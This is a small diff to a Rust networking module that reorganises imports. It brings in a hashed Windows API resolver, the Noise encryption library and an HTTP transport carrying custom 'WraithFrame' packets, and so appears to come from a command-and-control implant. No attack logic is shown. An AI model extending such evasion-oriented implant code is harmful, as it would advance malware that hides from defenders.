@@ -1,8 +1,14 @@
+#[cfg(not(target_os = "windows"))]
 use crate::utils::syscalls::*;
+use crate::utils::api_resolver::{hash_str, resolve_function};
 use alloc::format;
 use alloc::vec::Vec;
 use serde::{Deserialize, Serialize};
 use snow::Builder;
+use core::ffi::c_void;
+
+#[cfg(target_os = "windows")]
+use crate::utils::windows_definitions::{HANDLE, PVOID};
 
 pub mod packet;
 use packet::{WraithFrame, FRAME_TYPE_DATA};
@@ -161,9 +167,6 @@ impl HttpTransport {
         Self { host, port }
     }
 }
-
-#[cfg(target_os = "windows")]
-use crate::utils::api_resolver::{hash_str, resolve_function};
 
 #[cfg(target_os = "windows")]
 impl Transport for HttpTransport {
